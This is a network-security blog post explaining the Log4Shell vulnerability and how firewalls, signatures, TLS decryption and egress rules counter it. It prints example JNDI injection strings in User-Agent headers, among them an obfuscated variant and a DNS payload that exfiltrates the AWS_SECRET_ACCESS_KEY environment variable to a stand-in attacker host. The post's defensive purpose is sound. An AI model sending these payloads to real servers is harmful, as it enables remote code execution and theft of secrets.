---
date:
  created: 2021-12-29
categories:
  - Network Security
tags:
  - Security
---

# The Role of Network Security to Fight Log4Shell

December 9th, 2021 rocked the world for a significant number of IT professionals responsible for building and protecting applications their organizations create/deploy. Apache announced [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), commonly referred to as log4Shell, a zero-day vulnerability affecting their log4j logging software. Due to the severity of the vulnerability and the relative ease at which to exploit it, it is critical to ensure that affected assets are protected. This article aims to highlight how the network plays a critical role in the protection of assets and detection of vulnerabilities like log4shell.

<!-- more -->

## What is Log4J and JNDI?

[Log4j](https://logging.apache.org/log4j/2.x/) is a logging package used in many Java-based applications and websites. With web servers it is a best practice to log incoming requests, allowing operators of a site to audit access, assess performance, detect attacks, and perform retroactive investigations. As an example, when a web server receives an HTTP request from a client, the clients IP address, URI, HTTP method and headers (e.g. user-agent), and other data may be logged to file. In an HTTP POST, you may also have some of the content logged.

[Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) is used by log4j as a method of providing lookups on variables within a log by referencing naming and directory services such as LDAP, DNS, or other protocols. An example may include translating a username to groups that user is associated with, or an IP address to a FQDN. This can help build context within web server logs.

!!! note
    These definitions are most certainly over simplifications of log4j and JNDI, but are hopefully specific enough for context around this vulnerability.

## What is Log4Shell?

### The Vulnerabilities (So Far)

There have been multiple vulnerabilities released since log4shell/CVE-2021-44228 was announced, which have driven the need for organizations to update/patch their log4j implementations multiple times over the past several weeks.Additional vulnerabilities have been discovered in subsequent patches, but log4shell is by far the most severe and is what this article will focus on.

Log4shell allows a unauthenticated remote attacker to trigger a remote code execution (RCE) on an affected server, or exfiltration of data. Any website running an affected version of log4j, especially one that is internet facing or faces an untrusted zone, is particularly susceptible to this vulnerability as any attacker on the internet with IP reachability to the website can attempt to trigger the exploit.

An attacker triggers the exploit by sending a crafted JNDI string in an HTTP header such as the user-agent, or as post form data. The webserver may then log the JNDI string, inadvertantly performing a lookup on untrusted user input data. [Sanitization and validation of input data](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) is a best practice, commonly used to prevent attacks like [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection). However, because the logging of an HTTP request may happen before the validation stage of data, it may be difficult to implement with untrusted data like JNDI strings that affect your logging utility.

### Log4shell Attack Stages

Log4shell is a multi-stage attack whereby an attacker sends an initial HTTP request to a web server (stage 1) and if affected, the web server performs the JNDI lookup by referencing a server the the attacker controls to download malicious code (stage 2), and then executes the malicious code (stage 3).

!!! note
   User-Agent strings will be the primary examples in this article, but keep in mind that a JNDI string associated with any header or content that is logged by log4j can trigger the second phase of the attack. I also use an example destination of 127.0.0.1 but in reality this would be any IP address or hostname under the attackers control.

An example of a malicious string in the HTTP request would be setting an HTTP header such as the user-agent, to a string such as a basic example of:

```
"User-Agent: ${jndi:ldap://127.0.0.1/a}"
```

JNDI strings in HTTP requests can be far more complex, such as:

```
"User-Agent: ${${env:FOOBAR:-j}ndi:${env:FOOBAR:-l}dap${env:FOOBAR:-:}//127.0.0.1/a}"
```

This initial HTTP request isn't malicious on its own. Instead, it triggers an affected web server to place an LDAP request to an attacker controlled LDAP server on the internet. The attackers LDAP server then responds with a malicious payload which the server then executes. This could then open a backdoor for the attacker to load a more comprehensive and destructive payload to the server allowing an attacker to further surveil your network, identifying other vulnerable servers, allowing an attacker to gain a larger footprint in your environment.

The other aspect, which is more difficult to control (as described in the Prevention Measures section below), is a JNDI string that uses DNS instead of LDAP. An example of such a string is:

```
"User-Agent: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker-server.com}"
```

In this particular example an attacker sends a JNDI string that causes an affected web server to append an environment variable as a sub-domain to a DNS query directed at a domain/DNS server controlled by the attacker (attacker-server.com). While this doesn't cause a vulnerable server to execute malicious code, it does signify to an attacker that a server is vulnerable and allows for exfiltration of sensitive information. Of course the environment variable actually needs to exist, but it would be easy for an attacker to send a series of HTTP requests with common environment variable names in the hopes of getting some information. Additionally, an attacker could append another sub-domain as an ID specific to the web server they are attacking, to help them keep track of which particular server was vulnerable and any environment variables related to it.

## The Importance of Network Security

### The Unique Position of Network Devices

Before a web request is received by a web server, the request is most likely going to flow through multiple network devices (e.g. routers, switches, firewalls, load balancers) managed by the organization. Even if you are in a cloud environment such as AWS, Azure, or GCP, you have the ability to place your own virtual network devices (e.g. virtual firewalls or routers), or use one of the cloud vendors native network components.

Security devices that are in the path (e.g. firewalls, load balancers), or are receiving a copy of the transmitted data (e.g. using a monitor session to mirror the traffic to an intrusion detection platform) allow you to detect and possibly block multiple stages of the log4shell attack. A few examples of how you may detect and limit your impact to log4shell, from a network security perspective, include:

- Regularly (and automatically) updating security signatures on firewalls, load balancers, and intrusion detection appliances.
- Decrypting SSL/TLS traffic so that signatures are more effective.
- Implementing a security policy that restricts the communication to and from your critical assets like web servers.
- Having a robust network logging infrastructure.

### Security Device Signatures for Detection

Network security vendors use signatures to detect and potentially drop traffic that is likely to be considered malicious. Within several hours of log4shell being announced, many vendors were already releasing signature updates that their customers could use to detect log4shell. Many network security vendors signatures are focused on the first stage of the attack; detecting JNDI strings within HTTP requests. In the case of this vulnerability the situation has been extremely dynamic, and as you saw in the Log4shell Attack Stages section above, pattern matching for JNDI strings can be extremely complex. Over the days that followed the announcement of log4shell, vendors regularly updated and released new signatures for their products as the situation evolved (even several weeks after the announcement, signatures are still being released).

It is critical to ensure that these signatures are updated regularly and almost all network security platforms have a mechanism to automatically update their signatures on a scheduled basis. Monitoring that your network security platforms are on the latest signature version is critical. Additionally, each vendor may make an assumption on the action that its customers would want to take for a particular vulnerability, and as a result define a default action (e.g. drop, reset, alarm, allow) that a network security device takes when detecting a threat. Administrators should review these default actions to make sure that they align with their organizations assessment of the risk/exposure of the vulnerability and how it affects the business.

If you're hosting your applications in AWS, consider looking into [AWS Network Firewall and Suricata rules](https://aws.amazon.com/blogs/opensource/scaling-threat-prevention-on-aws-with-suricata/). While creating Suricata rules can be quite complex, Proofpoint offers an free/open rulset (and paid/PRO ruleset) called [Emerging Threats](https://rules.emergingthreats.net/open/suricata-5.0/) which are updated very regularly, and in the context of log4shell had signatures available quite quickly.

### TLS Decryption

Threat signatures are only as good as they data that is compared against them. With the ever growing use of TLS to encrypt and protect legitimate users data, malicious data is also encrypted. This provides a protection to an attacker, allowing them to avoid the eyes of the security platforms that we deploy in our environments. TLS decryption on firewalls and load balancers allows these network security devices to see the data that is traversing between clients and servers in clear text, before re-encrypting the data and sending it along its way.

Decryption makes threat signatures far more effective, but there are trade-offs. Depending on how much traffic is flowing through your network security device, it may not have the resources to decrypt all traffic without causing potential performance issues. By reviewing your network devices capabilities and assessing which traffic flows are the most critical to protect, you can determine what traffic should be decrypted while also limiting any performance issues.

### Additional Prevention Measures

If you're unable to utilize your network security devices to detect malicious JNDI strings, or the network security vendors threat signatures miss a variant of the string, it is important that your firewalls security policies restrict access from your web servers outbound to the internet over LDAP, DNS and other related JNDI protocols. As previously mentioned, the initial JNDI string in an HTTP request isn't malicious on its own. The attack relies on an affected web server communicating outbound with an attacker controlled LDAP server on the internet.

As a best practice, most firewall security policies should be created around a whitelist model that are very specific in permitting what protected resources can communicate with. Using a firewall platform that permits the creation of rules around _[applications](https://www.paloaltonetworks.com/technologies/app-id)_ instead of _services_ or _ports_ will help ensure that sessions through the firewall are exactly what they say they are. Take for example the following malicious JNDI string:

```
"User-Agent: ${jndi:ldap://127.0.0.1:443/a}"
```

If your firewall security policies are created around allowing TCP port 443 out to the internet for users browsing web pages, instead of an _application_ of HTTPS. An affected web server that receives this malicious JNDI string will attempt to communication over TCP port 443 using LDAP and the firewall will permit the traffic. Instead of creating a security policy permitting TCP port 443 for web browsing, creating a security policy that allows an application of HTTPS _and_ and TCP port of 443 would ensure that LDAP traffic over TCP port 443 is dropped.

In the case of a JNDI string that uses DNS as a service, there are two considerations to make:

- Do you prevent your web servers from utilizating any DNS server other than your corporate owned/managed DNS servers?
- Do you utilize any DNS monitoring features on your firewalls, such as Domain Generation Algorithm ([DGA](https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/)) and [DNS tunneling](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunnelingbehavior) detection?

If you allow users and servers in your environment to directly reference internet DNS servers out of your control (e.g. Google DNS) you lose an aspect of visibility and logging that you would otherwise get by enforcing all assets utilize a DNS server that you manage and control. This by itself doesn't prevent exfiltration of data with log4shell and a JNDI string using DNS. A vulnerable web server that receives such a JNDI string will send a DNS query to its local resolver, which you already most likely permit the web server to query. That local resolve will then most likely reference an upstream DNS server or the root DNS servers (also permitted through your firewall, or no one would be able to resolve internet FQDN's), to find an answer to the malicious domain name in the JNDI string. Eventually, through a series of iterative DNS queries the DNS server controlled by the attacker will receive the DNS query that the affected host sent, allowing it to log the data that was exfiltrated.

To block these types of DNS queries, either your firewalls or your DNS server/platform need to implement additional mechanisms of identifying malicious domain names that are either known or recently generated (DGA), or that are exhibiting DNS tunneling.

## Stepping Up Our Game As Network Security Engineers

As network security engineers it is important to fully understand the security platforms we support, and that the applications we protect are understood by us as more than just a source/destination IP and port. Our firewalls, load balancers, and intrusion detection devices are operating at all layers of the stack with full application layer visibility and implementing features at those layers. Building good relations with the application owners whose assets we are helping protect will help ensure that we can do so effectively.

My experience with reviewing log4shell was greatly aided by the fact that I have taken a full-stack developer course. Although I didn't learn Java based backends (I was focused on Flask and Django for a backend and HTML/CSS/JS/React at the frontend), it certainly helps me better understand the ecosystem surrounding web-based applications and API's which are the primary tech stacks that I'm helping protect. While it may not be possible for everyone to go out and take a full-stack course on top of their day job, but learn from your app team every time that you interact with them so that you gain a higher level of understanding. It may also help you next time they "blame the network" for an issue!
